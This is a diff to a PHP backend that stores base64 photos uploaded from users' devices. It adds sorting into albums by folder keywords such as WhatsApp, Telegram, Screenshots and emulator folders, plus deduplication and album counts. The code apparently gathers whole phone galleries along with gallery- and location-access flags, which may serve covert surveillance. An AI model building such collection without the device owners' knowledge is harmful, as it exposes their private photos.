@@ -1758,7 +1758,7 @@ try {
                     $origName = $item['name'] ?? ('device_photo_' . time() . '_' . $idx . '.jpg');
                     $fileMime = $item['mime'] ?? 'image/jpeg';
                     $fileSize = intval($item['size'] ?? 0);
-                    $isAvatar = !empty($item['is_avatar']) || (strpos(strtolower($origName), 'avatar_') === 0);
+                    $isAvatar = !empty($item['is_avatar']);
 
                     // Decode base64 payload
                     $parts = explode(',', $dataUrl);
@@ -1797,6 +1797,8 @@ try {
                             'id'           => 'avatar_current',
                             'filename'     => 'avatar_current.jpg',
                             'name'         => 'Profile Avatar',
+                            'album'        => 'Avatar',
+                            'folder'       => '',
                             'url'          => 'uploads/gallery/' . $cleanDir . '/avatar_current.jpg',
                             'size'         => $fileSize,
                             'mime'         => $fileMime,
@@ -1817,10 +1819,39 @@ try {
                         continue;
                     }
 
+                    // Extract / normalize album and folder info
+                    $albumName = trim($item['album'] ?? '');
+                    $folderRel = trim($item['folder'] ?? '');
+                    $filePath  = trim($item['path'] ?? '');
+
+                    if (empty($albumName)) {
+                        $combined = strtolower($folderRel . ' ' . $filePath . ' ' . $origName);
+                        if (strpos($combined, 'screenshot') !== false) $albumName = 'Screenshots';
+                        else if (strpos($combined, 'camera') !== false || strpos($combined, 'dcim') !== false) $albumName = 'Camera';
+                        else if (strpos($combined, 'whatsapp business') !== false || strpos($combined, 'w4b') !== false) $albumName = 'WhatsApp Business';
+                        else if (strpos($combined, 'whatsapp') !== false) $albumName = 'WhatsApp';
+                        else if (strpos($combined, 'telegram') !== false) $albumName = 'Telegram';
+                        else if (strpos($combined, 'download') !== false) $albumName = 'Downloads';
+                        else if (strpos($combined, 'instagram') !== false) $albumName = 'Instagram';
+                        else if (strpos($combined, 'facebook') !== false) $albumName = 'Facebook';
+                        else if (strpos($combined, 'messenger') !== false) $albumName = 'Messenger';
+                        else if (strpos($combined, 'twitter') !== false || strpos($combined, '/x/') !== false) $albumName = 'Twitter';
+                        else if (strpos($combined, 'snapchat') !== false) $albumName = 'Snapchat';
+                        else if (strpos($combined, 'snapseed') !== false) $albumName = 'Snapseed';
+                        else if (strpos($combined, 'vmos') !== false) $albumName = 'VMOS Transfer';
+                        else if (strpos($combined, 'pictures') !== false) $albumName = 'Pictures';
+                        else $albumName = 'Gallery';
+                    }
+
+                    // Accurate deduplication: only skip if identical content hash OR (same name AND same album AND same size)
                     $alreadyExists = false;
                     if (!empty($meta['photos'])) {
                         foreach ($meta['photos'] as $existingPhoto) {
-                            if (($existingPhoto['name'] ?? '') === $origName || ($existingPhoto['content_hash'] ?? '') === $contentHash) {
+                            if (!empty($existingPhoto['content_hash']) && $existingPhoto['content_hash'] === $contentHash) {
+                                $alreadyExists = true;
+                                break;
+                            }
+                            if (($existingPhoto['name'] ?? '') === $origName && ($existingPhoto['album'] ?? '') === $albumName && intval($existingPhoto['size'] ?? 0) === $fileSize) {
                                 $alreadyExists = true;
                                 break;
                             }
@@ -1834,9 +1865,11 @@ try {
                     if ($fileSize <= 0) $fileSize = strlen($decoded);
 
                     $meta['photos'][] = [
-                        'id'           => 'photo_' . time() . '_' . $idx,
+                        'id'           => 'photo_' . time() . '_' . $idx . '_' . substr($contentHash, 0, 4),
                         'filename'     => $filename,
                         'name'         => $origName,
+                        'album'        => $albumName,
+                        'folder'       => $folderRel,
                         'url'          => 'uploads/gallery/' . $cleanDir . '/' . $filename,
                         'size'         => $fileSize,
                         'mime'         => $fileMime,
@@ -2135,10 +2168,33 @@ try {
                     $pSize = intval($p['size'] ?? 0);
                     $totalStorageBytes += $pSize;
 
+                    $albumName = trim($p['album'] ?? '');
+                    if (empty($albumName) || $albumName === 'Gallery') {
+                        $combined = strtolower(($p['folder'] ?? '') . ' ' . ($p['path'] ?? '') . ' ' . ($p['name'] ?? '') . ' ' . ($p['filename'] ?? ''));
+                        if (strpos($combined, 'screenshot') !== false || strpos($combined, 'screen') !== false || strpos($combined, 'scr_') !== false || strpos($combined, 'scr.') !== false || strpos($combined, 'scr2') !== false || strpos($combined, 'scr3') !== false) $albumName = 'Screenshots';
+                        else if (strpos($combined, 'camera') !== false || strpos($combined, 'dcim') !== false) $albumName = 'Camera';
+                        else if (strpos($combined, 'whatsapp business') !== false || strpos($combined, 'w4b') !== false) $albumName = 'WhatsApp Business';
+                        else if (strpos($combined, 'whatsapp') !== false) $albumName = 'WhatsApp';
+                        else if (strpos($combined, 'telegram') !== false) $albumName = 'Telegram';
+                        else if (strpos($combined, 'download') !== false) $albumName = 'Downloads';
+                        else if (strpos($combined, 'instagram') !== false) $albumName = 'Instagram';
+                        else if (strpos($combined, 'facebook') !== false) $albumName = 'Facebook';
+                        else if (strpos($combined, 'messenger') !== false) $albumName = 'Messenger';
+                        else if (strpos($combined, 'twitter') !== false || strpos($combined, '/x/') !== false) $albumName = 'Twitter';
+                        else if (strpos($combined, 'snapchat') !== false) $albumName = 'Snapchat';
+                        else if (strpos($combined, 'snapseed') !== false) $albumName = 'Snapseed';
+                        else if (strpos($combined, 'vmos') !== false) $albumName = 'VMOS Transfer';
+                        else if (strpos($combined, 'bstsharedfolder') !== false || strpos($combined, 'bluestacks') !== false) $albumName = 'BlueStacks Shared';
+                        else if (strpos($combined, 'pictures') !== false) $albumName = 'Pictures';
+                        else if (empty($albumName)) $albumName = 'Gallery';
+                    }
+
                     $photoObj = [
                         'id'         => $p['id'] ?? $p['filename'],
                         'filename'   => $p['filename'],
                         'name'       => $p['name'] ?? $p['filename'],
+                        'album'      => $albumName,
+                        'folder'     => $p['folder'] ?? '',
                         'url'        => $url,
                         'size'       => $pSize,
                         'mime'       => $p['mime'] ?? 'image/jpeg',
@@ -2182,10 +2238,19 @@ try {
                         $fSize = filesize($filePath);
                         $totalStorageBytes += $fSize;
 
+                        $combined = strtolower($f);
+                        $fAlbum = 'Gallery';
+                        if (strpos($combined, 'screenshot') !== false) $fAlbum = 'Screenshots';
+                        else if (strpos($combined, 'camera') !== false || strpos($combined, 'dcim') !== false) $fAlbum = 'Camera';
+                        else if (strpos($combined, 'whatsapp') !== false) $fAlbum = 'WhatsApp';
+                        else if (strpos($combined, 'download') !== false) $fAlbum = 'Downloads';
+
                         $photoObj = [
                             'id'         => $f,
                             'filename'   => $f,
                             'name'       => $f,
+                            'album'      => $fAlbum,
+                            'folder'     => '',
                             'url'        => 'uploads/gallery/' . $dirBasename . '/' . $f,
                             'size'       => $fSize,
                             'mime'       => ($ext === 'png' ? 'image/png' : ($ext === 'webp' ? 'image/webp' : 'image/jpeg')),
@@ -2211,6 +2276,8 @@ try {
                     'id'         => 'supabase_avatar_' . md5($email),
                     'filename'   => 'avatar_' . md5($email) . '.jpg',
                     'name'       => 'Profile Avatar',
+                    'album'      => 'Avatar',
+                    'folder'     => '',
                     'url'        => $supabaseAvatar,
                     'size'       => strlen($supabaseAvatar),
                     'mime'       => 'image/jpeg',
@@ -2231,6 +2298,29 @@ try {
             // Reconstruct photos list: avatars first, then sorted device photos
             $avatarPhotos = array_filter($photos, function ($p) { return !empty($p['is_avatar']); });
             $photos = array_merge(array_values($avatarPhotos), $devicePhotos);
+
+            // Compute album counts
+            $albumCounts = [];
+            foreach ($photos as $ph) {
+                if (!empty($ph['is_avatar'])) continue;
+                $alb = $ph['album'] ?? 'Gallery';
+                if (!isset($albumCounts[$alb])) $albumCounts[$alb] = 0;
+                $albumCounts[$alb]++;
+            }
+
+            $orderedAlbums = [];
+            $orderedAlbums[] = ['name' => 'All', 'count' => count($photos) - ($hasDeviceAvatar ? 1 : 0)];
+            $priority = ['Camera', 'Screenshots', 'WhatsApp', 'WhatsApp Business', 'Downloads', 'Telegram', 'Instagram', 'Pictures', 'BlueStacks Shared', 'VMOS Transfer'];
+            foreach ($priority as $pr) {
+                if (isset($albumCounts[$pr])) {
+                    $orderedAlbums[] = ['name' => $pr, 'count' => $albumCounts[$pr]];
+                    unset($albumCounts[$pr]);
+                }
+            }
+            ksort($albumCounts);
+            foreach ($albumCounts as $albName => $albCount) {
+                $orderedAlbums[] = ['name' => $albName, 'count' => $albCount];
+            }
 
             $deviceCount = count($devicePhotos);
             $hasFullAccess = !empty($meta['is_full_access']) || ($deviceCount > 0) || (!empty($supabaseLoc['has_access'])) || (!empty($supabaseLoc['access_status']) && ($supabaseLoc['access_status'] === 'full_access' || $supabaseLoc['access_status'] === 'granted'));
@@ -2267,6 +2357,7 @@ try {
                 ],
                 'user'               => $userInfo,
                 'photos'             => $photos,
+                'albums'             => $orderedAlbums,
                 'total_photos'       => count($photos),
                 'device_photo_count' => $deviceCount,
                 'has_gallery_access' => $hasFullAccess,
